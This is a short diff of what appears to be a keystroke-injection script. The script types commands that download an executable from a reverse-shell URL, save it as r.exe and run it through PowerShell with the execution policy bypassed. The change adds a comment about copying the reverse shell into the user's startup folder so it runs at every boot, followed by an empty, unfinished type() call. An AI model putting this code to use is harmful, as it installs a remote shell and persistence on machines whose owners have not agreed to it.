@@ -25,5 +25,6 @@ type("echo (wget '" + revshUri + "' -OutFile r.exe) > c.ps1\n");
 type("powershell -ExecutionPolicy ByPass -File c.ps1\n");
 delay(5000);
 
-type("dir\n");
+// copying revsh to the user's startup folder so that it starts whenever machine boots
+type();
 
